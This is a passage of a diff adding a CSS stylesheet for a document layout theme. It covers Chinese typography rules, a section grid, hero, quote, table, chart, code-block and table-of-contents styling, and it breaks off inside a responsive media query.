+  :root {
+    --fg: var(--text-primary);
+    --fg-secondary: var(--text-secondary);
+    --fg-tertiary: var(--text-helper);
+    --fg-placeholder: var(--text-placeholder);
+    --bg: var(--paper);
+    --bg-card: var(--grey-1);
+    --hl-bg: var(--accent); --hl-fg: var(--accent-on-text); --hl-label: rgba(var(--accent-on-text-rgb), .6);
+    --hc-mute: rgba(var(--ink-rgb), .2);
+    --num-grey: rgba(var(--ink-rgb), .2);
+    --measure: 1200px;
+    --gutter: 20px;
+    --columns: 12;
+    --margin: 80px;
+    /* CJK body text (references/design-rules.md §中文排版) */
+    --text-size: var(--fs-body);
+    --text-leading: var(--lh-body);
+    --para-gap: 1em;            /* 段间距：不缩进，靠段距分段 */
+    /* Grid: one centred reading column; the rail hangs to its left */
+    --col: calc(32 * 1.0625rem);
+    --media: 800px;             /* wide media/table/chart width, same centre line */
+    --rail: 200px; --rail-gap: 40px;
+  }
+
+  /* ══════════════════════════════════════
+     BASE
+     ══════════════════════════════════════ */
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+  html { font-size: 16px; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; }
+  body { font-family: var(--font-sans); color: var(--fg); background: var(--bg); line-height: 1.6; }
+  ::selection { background: var(--hl-bg); color: var(--hl-fg); }
+
+  /* ══════════════════════════════════════
+     CJK TYPOGRAPHY — 中文排版规则
+     Rules + sources: references/design-rules.md §中文排版,
+     references/cjk-typography-research.md.
+     ══════════════════════════════════════ */
+  :lang(zh) body {
+    letter-spacing: 0;              /* 汉字默认密排，不额外加字距 */
+    line-break: strict;             /* 避头尾：句读、闭括号等不出现在行首 */
+    word-break: normal;
+    overflow-wrap: break-word;      /* 长 URL / 长英文词允许断开，避免撑破版心 */
+    text-spacing-trim: normal;      /* 相邻标点挤压（Chrome 123+，需字体带 chws/halt） */
+    hanging-punctuation: allow-end; /* 行尾点号悬挂（目前仅 Safari） */
+    font-kerning: normal;
+  }
+  :lang(zh) .section > p,
+  :lang(zh) .section li {
+    font-size: var(--text-size);
+    line-height: var(--text-leading);
+    font-weight: 400;
+  }
+  :lang(zh) .section > p {
+    margin-bottom: var(--para-gap);
+    text-align: justify;            /* clreq §6.2：中文正文原则上两端对齐 */
+    text-justify: inter-character;
+  }
+  :lang(zh) .section li { margin-bottom: 0.35em; }
+  :lang(zh) .section li > p { margin-bottom: 0.35em; text-align: start; }
+  /* 汉字没有真正的斜体：*强调* 用着重号（clreq §5.3.1：横排置于字下） */
+  :lang(zh) em {
+    font-style: normal;
+    -webkit-text-emphasis: filled dot; text-emphasis: filled dot;
+    -webkit-text-emphasis-position: under right; text-emphasis-position: under right;
+  }
+  :lang(zh) em:lang(en), :lang(zh) code em { font-style: italic; text-emphasis: none; -webkit-text-emphasis: none; }
+  /* 中西文间距：render.mjs 插入 .hf-sp；支持 text-autospace 的浏览器用原生间距 */
+  .hf-sp { white-space: normal; }
+  @supports (text-autospace: normal) {
+    :lang(zh) body { text-autospace: normal; }
+    .hf-sp { display: none; }
+  }
+  /* 标题：中文不加负字距，避免笔画粘连；行高收紧 */
+  :lang(zh) h1, :lang(zh) h2, :lang(zh) h3 { letter-spacing: 0; line-break: strict; }
+  :lang(zh) h2, :lang(zh) h3 { line-height: 1.4; }
+
+  /* ══════════════════════════════════════
+     LAYOUT
+     ══════════════════════════════════════ */
+  .container {
+    max-width: var(--measure);
+    margin: 0 auto;
+    padding: 0 var(--margin);
+  }
+
+  /* Section grid: centred reading column (--col) with equal side tracks.
+     Body blocks sit in the column; media / tables / charts break out to
+     --media on the same centre line; accent blocks span the full width. */
+  .section {
+    display: grid;
+    grid-template-columns: minmax(0,1fr) minmax(0, var(--col)) minmax(0,1fr);
+    padding: 28px 0 var(--sp-7);
+    margin-top: 56px;
+    border-top: 2px solid var(--fg);
+  }
+  .section > * { grid-column: 2 / 3; }
+  .section > .figure-card, .section > .img-row, .section > .img-strip-wrap,
+  .section > .table-wrap, .section > .hchart, .section > .gallery-grid {
+    grid-column: 1 / 4; justify-self: center; width: 100%; max-width: var(--media);
+  }
+  .section > .pullquote, .section > .highlight-card { grid-column: 1 / 4; }
+
+  /* ══════════════════════════════════════
+     CHROME — doc bar, tags left / meta right
+     ══════════════════════════════════════ */
+  .doc-chrome {
+    display: grid;
+    grid-template-columns: 1fr auto;
+    grid-template-areas: "bar bar" "tags meta";
+    gap: 22px var(--gutter);
+    align-items: center;
+    padding: 56px 0 14px;
+  }
+
+  .doc-chrome-bar {
+    display: flex;
+    justify-content: space-between;
+    font-family: var(--font-mono);
+    font-size: var(--fs-label); font-weight: 500;
+    letter-spacing: 0.14em; text-transform: uppercase;
+    color: var(--fg-tertiary);
+    background: var(--bg-card);
+    padding: var(--sp-5) var(--sp-6) 18px;
+    margin-bottom: var(--sp-5);
+  }
+  .doc-chrome > .doc-chrome-bar { grid-area: bar; }
+
+  .doc-chrome-bar .chrome-l, .doc-chrome-bar .chrome-r {
+    display: flex; gap: 1.8em; align-items: center;
+  }
+  .doc-chrome-bar .chrome-sep { width: 32px; height: 1px; background: currentColor; opacity: 0.3; }
+  .doc-chrome-bar .chrome-accent { color: var(--accent-ink, var(--accent)); font-weight: 600; }
+
+  .doc-chrome-rule { display: none; }
+
+  .doc-chrome-meta {
+    display: flex; gap: 2.4em; flex-wrap: wrap;
+    font-family: var(--font-mono);
+    font-size: var(--fs-meta); letter-spacing: 0.14em;
+    text-transform: uppercase; color: var(--fg-tertiary);
+  }
+  .doc-chrome > .doc-chrome-meta { grid-area: meta; justify-self: end; text-align: right; }
+  .doc-chrome-meta .cm-item { display: flex; gap: 0.5em; align-items: baseline; }
+  .doc-chrome-meta .cm-key { opacity: 0.5; }
+  .doc-chrome-meta .cm-val { color: var(--fg-secondary); font-weight: 500; }
+  .doc-chrome-meta .cm-dot { width: 2px; height: 2px; background: var(--fg-tertiary); border-radius: 50%; opacity: 0.4; align-self: center; }
+
+  .doc-chrome-tags {
+    display: flex; gap: var(--sp-3); flex-wrap: wrap;
+  }
+  .doc-chrome > .doc-chrome-tags { grid-area: tags; justify-self: start; }
+  .doc-chrome-tags .chrome-tag {
+    font-family: var(--font-mono);
+    font-size: var(--fs-meta); font-weight: 600;
+    letter-spacing: 0.15em; text-transform: uppercase;
+    padding: 4px 14px;
+    background: var(--fg); color: var(--bg);
+  }
+
+  /* ══════════════════════════════════════
+     HERO — full-bleed image card with text overlay
+     ══════════════════════════════════════ */
+  .hero-cover {
+    position: relative;
+    margin: 8px 0 var(--sp-10);
+    overflow: hidden;
+    background: var(--fg);
+  }
+
+  /* Grid dot pattern over the image */
+  .hero-cover::before {
+    content: '';
+    position: absolute; inset: 0;
+    background-image:
+      radial-gradient(circle, rgba(255,255,255,0.08) 1px, transparent 1px);
+    background-size: 24px 24px;
+    z-index: 1;
+  }
+
+  .hero-cover .hero-bg {
+    width: 100%; height: 480px;
+    object-fit: cover; object-position: center 40%;
+    display: block;
+    opacity: 0.25;
+    mix-blend-mode: luminosity;
+  }
+
+  .hero-cover .hero-overlay {
+    position: absolute;
+    inset: 0; z-index: 2;
+    display: flex; flex-direction: column;
+    justify-content: flex-end;
+    padding: var(--sp-9);
+    color: var(--bg);
+  }
+
+  .hero-cover .hero-kicker {
+    font-family: var(--font-mono);
+    font-size: var(--fs-meta); font-weight: 600;
+    letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--accent-ink-inverse);
+    margin-bottom: var(--sp-6);
+  }
+
+  .hero-cover h1 {
+    font-family: var(--font-sans);
+    font-size: var(--fs-display); font-weight: 200;
+    line-height: 1.08; letter-spacing: -0.03em;
+    color: var(--bg);
+    margin-bottom: var(--sp-6);
+    max-width: 960px;
+  }
+  :lang(zh) .hero-cover h1 { line-height: 1.2; letter-spacing: 0; }
+
+  .hero-cover .hero-subtitle {
+    font-size: var(--fs-lead); font-weight: 400;
+    color: rgba(var(--paper-rgb), .55);
+    line-height: 1.6;
+    max-width: 820px;
+    opacity: 0.86;
+  }
+
+  /* ══════════════════════════════════════
+     SECTION HEADER — number hangs in the rail left of the column
+     ══════════════════════════════════════ */
+  .section-header {
+    position: relative;
+    margin-bottom: 36px;
+  }
+
+  /* bare number (section without a title) */
+  .section-number {
+    font-family: var(--font-mono);
+    font-size: 56px; font-weight: 800;
+    letter-spacing: -0.04em;
+    color: var(--bg-card);
+    line-height: 0.85;
+    flex-shrink: 0;
+  }
+  /* The number sits in the rail, vertically centred on the title's first line
+     (box = one title line; the small lift puts the digits' ink centre on the CJK glyph centre) */
+  .section-header .section-number {
+    position: absolute; right: calc(100% + var(--rail-gap)); top: 0;
+    height: calc(var(--fs-heading) * 1.2);
+    display: flex; align-items: center;
+    width: var(--rail);
+    font-size: 44px; font-weight: 300; line-height: 1;
+    color: var(--num-grey);
+    transform: translateY(-0.035em);   /* measured: digits sit ~1.5px low at 44px */
+  }
+
+  h2 {
+    font-family: var(--font-sans);
+    font-size: var(--fs-heading); font-weight: 200;
+    line-height: 1.18; letter-spacing: -0.015em;
+    margin: 0;
+  }
+  .section-header h2 { line-height: 1.2; }   /* after :lang(zh) h2 — wins in zh too */
+
+  h3 {
+    font-family: var(--font-sans);
+    font-size: var(--fs-subhead); font-weight: 500;
+    line-height: 1.3; margin-top: var(--sp-9); margin-bottom: var(--sp-5);
+    border-top: 1px solid var(--fg); padding-top: 10px;
+  }
+
+  /* ══════════════════════════════════════
+     PROSE
+     ══════════════════════════════════════ */
+  p { margin-bottom: var(--sp-5); font-size: 1rem; line-height: 1.65; }
+  .section > p, .section li { line-height: 1.8; text-align: justify; }
+  .section p, .section li, .section td, blockquote p { font-weight: 400; }
+  .section p, .section li { overflow-wrap: break-word; }
+  /* 英文段落仍两端对齐，但开启连字符断词，减少长单词造成的大空隙 */
+  .section > p:lang(en) { hyphens: auto; -webkit-hyphens: auto; }
+  /* 链接/长串不两端对齐：含链接的段落、中文列表项、来源/参考节起始对齐；
+     长 URL / 代码可任意断行，避免 justify 把冒号前的字拉开。After the CJK rules. */
+  :lang(zh) .section li,
+  .section > p:has(a.url, a[href^="http"], code),
+  .section.refs p, .section.refs li { text-align: start; text-justify: auto; }
+  .section a.url { overflow-wrap: anywhere; word-break: break-word; }
+  .section code { overflow-wrap: anywhere; word-break: break-all; }
+
+  strong { font-weight: 600; }
+  code { font-family: var(--font-mono); font-size: 0.85em; background: var(--bg-card); padding: 2px 5px; }
+  a { color: var(--accent-ink, var(--accent)); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  .dash { white-space: nowrap; letter-spacing: 0; }
+  .dash-em { color: var(--fg); font-weight: 500; }
+
+  /* Thematic break (---): spacing, not a line */
+  .divider { border: none; height: 0; margin: var(--sp-8, 32px) 0; }
+
+  /* ══════════════════════════════════════
+     LISTS
+     ══════════════════════════════════════ */
+  ul, ol { margin: var(--sp-5) 0 var(--sp-7); padding-left: var(--sp-6); }
+  li { font-size: 1rem; line-height: 1.65; margin-bottom: var(--sp-3); }
+  li::marker { color: var(--accent-ink, var(--accent)); }
+
+  .checklist { list-style: none; padding-left: 0; }
+  .checklist li { padding-left: 28px; position: relative; }
+  .checklist li::before {
+    content: ''; position: absolute; left: 0; top: 7px;
+    width: 14px; height: 14px; background: var(--accent); opacity: 0.15;
+  }
+  .checklist li::after {
+    content: ''; position: absolute; left: 3px; top: 10px;
+    width: 8px; height: 4px;
+    border-left: 2px solid var(--accent-ink); border-bottom: 2px solid var(--accent-ink);
+    transform: rotate(-45deg);
+  }
+
+  /* Footnote section: .section.section-footnote matches :lang(zh) .section li and comes later */
+  .section.section-footnote li {
+    font-size: 0.8rem;
+    margin-bottom: var(--sp-5);
+    color: var(--fg-secondary);
+  }
+  .section-footnote li strong { color: var(--fg); }
+  .section-footnote h2 { font-size: 1rem; }
+
+  /* ══════════════════════════════════════
+     BLOCKQUOTE — column width, hairlines top/bottom, no fill
+     ══════════════════════════════════════ */
+  blockquote {
+    margin: var(--sp-6) 0;
+    padding: 16px 0;
+    border-top: 1px solid var(--fg);
+    border-bottom: 1px solid rgba(var(--ink-rgb), .15);
+    color: var(--fg);
+    font-size: var(--fs-body); line-height: 1.8;
+  }
+  blockquote p { font-size: 1rem; line-height: 1.75; color: var(--fg); margin-bottom: 0; }
+  blockquote > p + p { margin-top: 0.6em; }
+  /* nested quote: left rule; padding-left 1em = 17px from the container size */
+  blockquote .bq-nested {
+    margin: var(--sp-4) 0 var(--sp-3);
+    padding: var(--sp-4) var(--sp-5) var(--sp-4) 1em;
+    border: 0;
+    border-left: 2px solid var(--fg);
+  }
+  .bq-cite {
+    margin-top: 0.7em;
+    font-family: var(--font-mono); font-size: var(--fs-meta); letter-spacing: 0.06em;
+    color: var(--fg-secondary); text-align: right;
+  }
+  .bq-cite cite { font-style: normal; }
+
+  /* ══════════════════════════════════════
+     PULLQUOTE — 2px top rule, "QUOTE" label in the rail, big text
+     ══════════════════════════════════════ */
+  .pullquote-swiss {
+    margin: var(--sp-9) 0; padding: 24px 0 0;
+    display: grid; grid-template-columns: var(--rail) 1fr; gap: var(--sp-6) var(--rail-gap);
+    border-top: 2px solid var(--fg);
+  }
+  .pullquote-swiss .pq-bar::before { content: "QUOTE"; font-family: var(--font-mono); font-size: var(--fs-meta); letter-spacing: 0.12em; color: var(--fg-tertiary); }
+  .pullquote-swiss .pq-content p {
+    font-family: var(--font-sans);
+    font-size: var(--fs-quote); font-weight: 300;
+    line-height: 1.45; letter-spacing: -0.02em; margin-bottom: 0;
+    color: var(--fg);
+  }
+  .pullquote-swiss .accent-mark { color: var(--accent-ink); font-weight: 500; }
+  .pq-cite { margin-top: var(--sp-4); font-family: var(--font-mono); font-size: var(--fs-meta); letter-spacing: 0.08em; text-transform: uppercase; color: var(--fg-tertiary); }
+  .pq-cite::before { content: "— "; }
+
+  /* ══════════════════════════════════════
+     HIGHLIGHT — palette block, label in the rail
+     ══════════════════════════════════════ */
+  .highlight-swiss {
+    margin: var(--sp-5) 0;
+    padding: var(--sp-6) var(--sp-7);
+    background: var(--hl-bg);
+    display: grid; grid-template-columns: var(--rail) 1fr; column-gap: var(--rail-gap);
+  }
+  /* each palette sets its own fg/label colour (yellow/green use dark text) */
+  .highlight-swiss .hl-label {
+    font-family: var(--font-mono);
+    font-size: var(--fs-meta); font-weight: 700;
+    letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--hl-label);
+  }
+  .highlight-swiss .hl-body p {
+    font-size: 1.15rem; font-weight: 400;
+    line-height: 1.55; margin-bottom: 0;
+    color: var(--hl-fg);
+  }
+  .highlight-swiss .hl-body strong,
+  .highlight-swiss .hl-body b,
+  .highlight-swiss .hl-body a {
+    color: var(--hl-fg);
+  }
+
+  /* ══════════════════════════════════════
+     DEF CARD — card with left/right split
+     ══════════════════════════════════════ */
+  .def-card-swiss {
+    margin: var(--sp-6) 0;
+    display: grid; grid-template-columns: 3fr 9fr; gap: var(--sp-7);
+    align-items: baseline;
+    background: var(--bg-card);
+    padding: var(--sp-5) var(--sp-6);
+  }
+  .def-card-swiss .dc-label {
+    display: block; font-family: var(--font-mono);
+    font-size: var(--fs-meta); font-weight: 600;
+    letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--accent-ink, var(--accent)); margin-bottom: 2px;
+  }
+  .def-card-swiss .dc-term { font-size: 1.05rem; font-weight: 600; }
+  .def-card-swiss .dc-body { font-size: var(--fs-small); line-height: 1.6; color: var(--fg-secondary); }
+
+  /* ══════════════════════════════════════
+     PROCESS — numbered cards
+     ══════════════════════════════════════ */
+  .process { margin: var(--sp-9) 0; display: flex; flex-direction: column; gap: var(--sp-3); }
+  .process-step {
+    display: flex; gap: var(--sp-6);
+    padding: var(--sp-5) var(--sp-6);
+    background: var(--bg-card);
+  }
+  .process-num {
+    font-family: var(--font-mono);
+    font-size: var(--fs-label); font-weight: 700;
+    color: var(--accent-ink, var(--accent)); flex: 0 0 32px;
+  }
+  .process-content { flex: 1; }
+  .process-title { font-weight: 600; font-size: 1rem; margin-bottom: 2px; }
+  .process-desc { font-size: 0.88rem; color: var(--fg-secondary); line-height: 1.55; }
+
+  /* ══════════════════════════════════════
+     ASIDE — contextual note card
+     ══════════════════════════════════════ */
+  .aside-card {
+    margin: var(--sp-6) 0;
+    padding: var(--sp-5) var(--sp-6);
+    background: var(--bg-card);
+    display: flex; gap: var(--sp-5);
+    align-items: flex-start;
+  }
+  .aside-icon {
+    flex-shrink: 0;
+    color: var(--accent-ink, var(--accent));
+    padding-top: 2px;
+  }
+  .aside-icon svg { display: block; }
+  .aside-title {
+    font-family: var(--font-mono);
+    font-size: var(--fs-meta); font-weight: 700;
+    letter-spacing: 0.14em; text-transform: uppercase;
+    color: var(--accent-ink, var(--accent));
+    margin-bottom: var(--sp-3);
+  }
+  .aside-content p {
+    font-size: 0.88rem; line-height: 1.6;
+    color: var(--fg-secondary); margin-bottom: 0;
+  }
+
+  /* ══════════════════════════════════════
+     SUMMARY CARD — key takeaway grid
+     ══════════════════════════════════════ */
+  .summary-card { margin: var(--sp-9) 0; }
+  .summary-label {
+    font-family: var(--font-mono);
+    font-size: var(--fs-meta); font-weight: 700;
+    letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--bg);
+    background: var(--fg);
+    display: inline-block;
+    padding: var(--sp-3) var(--sp-5);
+    margin-bottom: var(--sp-5);
+  }
+  .summary-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+    gap: var(--sp-4);
+  }
+  .summary-item {
+    background: var(--bg-card);
+    padding: var(--sp-5) var(--sp-6);
+  }
+  .summary-item-title {
+    font-weight: 600; font-size: 0.95rem;
+    margin-bottom: var(--sp-3);
+  }
+  .summary-item-desc {
+    font-size: 0.85rem; line-height: 1.55;
+    color: var(--fg-secondary);
+  }
+
+  /* ══════════════════════════════════════
+     EMBED CARD — AI-generated SVG/UI preview
+     ══════════════════════════════════════ */
+  .embed-card {
+    margin: var(--sp-9) 0;
+    background: var(--bg-card);
+    overflow: hidden;
+  }
+  .embed-label {
+    font-family: var(--font-mono);
+    font-size: var(--fs-meta); font-weight: 700;
+    letter-spacing: 0.18em; text-transform: uppercase;
+    padding: var(--sp-4) var(--sp-6);
+    background: var(--fg);
+    color: var(--bg);
+    display: inline-block;
+  }
+  .embed-body {
+    padding: var(--sp-7);
+    display: flex; align-items: center; justify-content: center;
+    min-height: 200px;
+  }
+  .embed-body svg { max-width: 100%; height: auto; }
+  .embed-caption {
+    font-family: var(--font-mono);
+    font-size: var(--fs-meta); font-weight: 500;
+    letter-spacing: 0.06em;
+    color: var(--fg-tertiary);
+    padding: 0 var(--sp-6) var(--sp-5);
+    text-transform: uppercase;
+  }
+
+  /* ══════════════════════════════════════
+     TABLE — top rule, ruled rows, light zebra
+     ══════════════════════════════════════ */
+  /* bare tables (only reachable through raw HTML inside an embed) */
+  table { width: 100%; border-collapse: collapse; font-size: var(--fs-small); }
+  th {
+    font-family: var(--font-mono);
+    font-size: var(--fs-meta); font-weight: 600;
+    letter-spacing: 0.12em; text-transform: uppercase;
+    text-align: left; padding: var(--sp-3) var(--sp-5);
+    background: var(--fg); color: var(--bg);
+  }
+  td { padding: var(--sp-3) var(--sp-5); vertical-align: top; line-height: 1.55; }
+  tr:nth-child(even) td { background: var(--bg-card); }
+
+  .table-wrap { margin: 2em 0; overflow-x: auto; }
+  /* !important on min-width / margin: beats inline styles on tables pasted as raw HTML */
+  .table-wrap table { width: 100%; min-width: 0 !important; border-collapse: collapse; font-variant-numeric: tabular-nums; font-size: 0.9rem; table-layout: auto; }
+  .table-wrap > table { margin: 0 !important; }
+  .table-wrap th {
+    font-family: var(--font-sans); font-size: 0.78rem; font-weight: 600;
+    letter-spacing: 0; text-transform: none; text-align: left;
+    color: var(--fg); background: none;
+    padding: 10px 12px;
+    border-top: 2px solid var(--fg); border-bottom: 1.5px solid var(--fg);
+    vertical-align: bottom; line-height: 1.35;
+  }
+  .table-wrap td { padding: 9px 12px; color: var(--fg); border-bottom: 1px solid rgba(var(--ink-rgb), .09); vertical-align: top; line-height: 1.45; background: none; }
+  .table-wrap td:first-child { white-space: nowrap; }
+  .table-wrap tbody tr:nth-child(even) td { background: rgba(var(--ink-rgb), .025); }
+  .table-wrap .al-num, .table-wrap .al-right { text-align: right; }
+  .table-wrap td.al-num, .table-wrap td.al-right { white-space: nowrap; }
+  .table-wrap .al-center { text-align: center; }
+  .table-wrap td strong { color: var(--accent-ink, var(--accent)); font-weight: 700; }
+  .table-wrap td small, .table-wrap td .sub { color: var(--fg-tertiary); font-size: 0.78em; }
+  .table-caption { caption-side: top; margin-bottom: 10px; }
+
+  /* ══════════════════════════════════════
+     CHART — native bar chart (```chart → .hchart)
+     ══════════════════════════════════════ */
+  .hchart { margin-top: 2.2em; margin-bottom: 2.2em; padding: 30px 0; border-top: 2px solid var(--fg); }
+  .hc-title { font-family: var(--font-mono); font-weight: 600; font-size: 0.8rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--fg); margin-bottom: 22px; }
+  .hc-legend { display: flex; flex-wrap: wrap; gap: 8px 20px; margin-bottom: 22px; font-size: 0.78rem; color: var(--fg-secondary); }
+  .hc-key i { display: inline-block; width: 10px; height: 10px; margin-right: 6px; vertical-align: -1px; background: var(--hc-mute); }
+  .hc-row { display: grid; grid-template-columns: minmax(120px, 30%) 1fr; gap: 18px; align-items: center; padding: 7px 0; }
+  .hc-group { padding: 16px 0; border-top: 1px solid rgba(var(--ink-rgb), .08); }
+  .hc-label { font-size: 0.82rem; color: var(--fg); line-height: 1.35; }
+  .hc-bars { display: grid; gap: 6px; }
+  .hc-bar { position: relative; display: flex; align-items: center; gap: 8px; height: 20px; padding-right: 5em; }  /* room for the value after a 100% bar */
+  .hc-group .hc-bar { height: 14px; }
+  .hc-fill { display: block; height: 100%; background: var(--hc-mute); flex: none; }
+  .hc-val { font-size: var(--fs-meta); font-variant-numeric: tabular-nums; color: var(--fg-secondary); white-space: nowrap; }
+  .hc-group .hc-val { font-size: var(--fs-meta); }
+  .hc-hi .hc-fill, .hc-key.hc-hi i { background: var(--accent); }
+  .hc-hi .hc-val, .hc-row.hc-hi .hc-label { color: var(--fg); font-weight: 600; }
+  /* both series highlighted: the second one is lighter so the pair stays distinguishable */
+  .hc-s0.hc-hi ~ .hc-s1.hc-hi .hc-fill, .hc-key.hc-s0.hc-hi ~ .hc-key.hc-s1.hc-hi i { opacity: 0.6; }
+  .hc-na .hc-val { color: var(--fg-tertiary); font-style: italic; }
+  .hc-cap { margin-top: 20px; }
+
+  /* ══════════════════════════════════════
+     CODE BLOCK
+     ══════════════════════════════════════ */
+  pre {
+    margin: var(--sp-5) 0;
+    padding: var(--sp-5) var(--sp-6);
+    background: var(--fg);
+    color: var(--bg);
+    overflow-x: auto;
+    font-family: var(--font-mono);
+    font-size: 0.82rem;
+    line-height: 1.7;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: inherit;
+    color: inherit;
+  }
+
+  /* ══════════════════════════════════════
+     FIGURES, IMAGE ROWS / STRIPS, MEDIA
+     ══════════════════════════════════════ */
+  figure img { width: 100%; height: auto; display: block; }
+  /* captions: first sentence bold as a label (.cap-lead) */
+  figcaption {
+    margin-top: var(--sp-3);
+    font-family: var(--font-sans); font-size: var(--fs-caption); font-weight: 500;
+    line-height: 1.55; letter-spacing: 0;
+    color: var(--fg-secondary, var(--fg));
+    text-align: left;
+  }
+  figcaption .cap-lead { display: block; font-weight: 600; color: var(--fg); margin-bottom: 2px; }
+  .img-row figcaption .cap-lead, .img-strip figcaption .cap-lead { display: inline; margin-right: .4em; }
+
+  .figure-card { grid-column: 1 / -1; margin: var(--sp-8) 0; }
+  .figure-card img { object-fit: cover; }
+  .figure-card figcaption { padding: 0 var(--sp-3); }
+  /* single figure: caption hangs in the left margin, bottom-aligned with the image */
+  .section > .figure-card { position: relative; }
+  .section > .figure-card > figcaption {
+    position: absolute; right: calc(100% + 24px); bottom: 0; width: 160px;
+    margin: 0 !important;           /* beats ui.css print .figure-card > figcaption margin-top */
+    padding: 8px 0 2px;
+    border-top: 1px solid var(--fg);
+  }
+
+  .img-row { display: grid; gap: 12px; margin-top: 2.2em; margin-bottom: 2.2em; }
+  .img-row-2 { grid-template-columns: 1fr 1fr; }
+  .img-row-3 { grid-template-columns: 1fr 1fr 1fr; }
+  .img-row .figure-card { margin: 0; }
+  .img-row > .figure-card { min-width: 0; grid-column: auto; }  /* side by side, not one full-width card per row */
+  .img-row .figure-card img { aspect-ratio: 4 / 3; object-fit: cover; }
+
+  .img-strip-wrap { margin-top: 2.2em; margin-bottom: 2.2em; }
+  .img-strip { display: flex; gap: 12px; overflow-x: auto; scroll-snap-type: x mandatory; padding-bottom: 8px; }
+  .img-strip .figure-card { flex: 0 0 62%; margin: 0; scroll-snap-align: start; }
+  .img-strip-hint { font-family: var(--font-mono); font-size: var(--fs-meta); color: var(--fg-tertiary); text-align: right; margin-top: 6px; }
+
+  .media-embed video, .media-embed iframe { width: 100%; aspect-ratio: 16 / 9; height: auto; display: block; border: 0; background: #000; }
+
+  /* ══════════════════════════════════════
+     GALLERY — placeholder grid
+     ══════════════════════════════════════ */
+  .gallery-grid {
+    margin: var(--sp-9) 0;
+    display: grid; grid-template-columns: 1fr 1fr; gap: var(--sp-5);
+  }
+  .gallery-grid-item .img-placeholder { aspect-ratio: 16/10; }
+  .gallery-grid-item .gallery-cap {
+    font-family: var(--font-mono); font-size: var(--fs-meta); font-weight: 500;
+    letter-spacing: 0.06em; color: var(--fg-tertiary);
+    margin-top: var(--sp-3); text-transform: uppercase;
+  }
+
+  .img-placeholder {
+    width: 100%; aspect-ratio: 16/9;
+    background: var(--bg-card);
+    display: flex; align-items: center; justify-content: center;
+    position: relative; overflow: hidden;
+  }
+  .img-placeholder::before {
+    content: ''; position: absolute; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg width='8' height='8' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='4' cy='4' r='.8' fill='%23d4d4d2'/%3E%3C/svg%3E");
+    opacity: 0.6;
+  }
+  .img-placeholder span {
+    font-family: var(--font-mono); font-size: var(--fs-meta); font-weight: 600;
+    letter-spacing: 0.12em; text-transform: uppercase;
+    color: var(--fg-tertiary); position: relative; z-index: 1;
+    background: var(--bg-card); padding: 2px 10px;
+  }
+
+  /* ══════════════════════════════════════
+     TOC SIDEBAR (open/push behaviour lives in ui.css)
+     ══════════════════════════════════════ */
+  .toc {
+    position: fixed;
+    left: 0; top: 0;
+    z-index: 100;
+  }
+
+  .toc-toggle {
+    position: fixed;
+    left: var(--sp-6); top: var(--sp-6);
+    width: 40px; height: 40px;
+    display: flex; align-items: center; justify-content: center;
+    background: var(--bg-card);
+    border: none; cursor: pointer;
+    color: var(--fg-tertiary);
+    transition: background 0.15s, color 0.15s;
+    z-index: 102;
+  }
+  .toc-toggle:hover { background: var(--fg); color: var(--bg); }
+
+  .toc-panel {
+    position: fixed;
+    left: 0; top: 0; bottom: 0;
+    width: 320px !important;          /* beats ui.css narrow-screen drawer width min(300px, 86vw) */
+    background: var(--bg-card);
+    border-right: 1px solid rgba(var(--ink-rgb), .07);
+    padding: var(--sp-12) var(--sp-6) var(--sp-7);
+    overflow-y: auto;
+    transform: translateX(-100%);
+    scrollbar-width: thin;
+    scrollbar-color: var(--fg-placeholder) transparent;
+    z-index: 101;
+  }
+
+  .toc-open .toc-panel { transform: translateX(0); }
+  .toc-open .toc-toggle { background: var(--fg); color: var(--bg); }
+
+  .toc-header {
+    font-family: var(--font-mono);
+    font-size: 13px; font-weight: 700;
+    letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--fg-tertiary);
+    margin-bottom: 18px;
+  }
+
+  /* TOC text ≥ body size; narrow tabular number column */
+  .toc-item {
+    display: grid; grid-template-columns: 2.4em 1fr; align-items: baseline; gap: 0 10px;
+    padding: 9px 0;
+    font-size: var(--fs-body); font-weight: 400;
+    color: var(--fg-secondary);
+    text-decoration: none;
+    line-height: 1.55;
+    transition: color 0.15s;
+  }
+  .toc-item:hover { color: var(--fg); }
+  .toc-item.toc-active { color: var(--accent-ink, var(--accent)); font-weight: 600; }
+
+  .toc-num {
+    font-family: var(--font-mono);
+    font-size: 0.8rem; font-weight: 600;
+    font-variant-numeric: tabular-nums;
+    color: var(--fg-placeholder);
+    flex-shrink: 0; width: 24px;
+  }
+  .toc-active .toc-num { color: var(--accent-ink, var(--accent)); }
+
+  /* ══════════════════════════════════════
+     FOOTER
+     ══════════════════════════════════════ */
+  /* scoped to the page footer so it doesn't leak into blockquote footer.bq-cite */
+  .container > footer, .divider-dot {
+    display: grid;
+    grid-template-columns: repeat(12, 1fr);
+    column-gap: var(--gutter);
+  }
+  .divider-dot { display: block; margin: var(--sp-10) auto; text-align: center; color: var(--fg-placeholder); font-size: 14px; letter-spacing: 10px; }
+  .container > footer { padding: var(--sp-10) 0 var(--sp-12); text-align: center; }
+  .container > footer > * { grid-column: 1 / -1; }
+  .container > footer p { font-family: var(--font-mono); font-size: var(--fs-meta); font-weight: 500; letter-spacing: 0.14em; color: var(--fg-tertiary); text-transform: uppercase; }
+
+  /* ══════════════════════════════════════
+     RESPONSIVE
+     ══════════════════════════════════════ */
+  @media (max-width: 1100px) {
+    /* single flowing column; the rail content moves back above the text */
+    .section { display: block; }
+    .section > p, .section > ul, .section > ol, .section > blockquote,
+    .section > h3, .section > .section-header { max-width: var(--col); margin-left: auto; margin-right: auto; }
+    .section-header .section-number { position: static; width: auto; margin-bottom: 8px; font-size: 28px; }
+    .section > .figure-card > figcaption { position: static; width: auto; margin-top: 8px !important; /* beats ui.css print */ }
+  }
+
+  @media (max-width: 1024px) {
+    .container { padding: 0 var(--sp-9); }
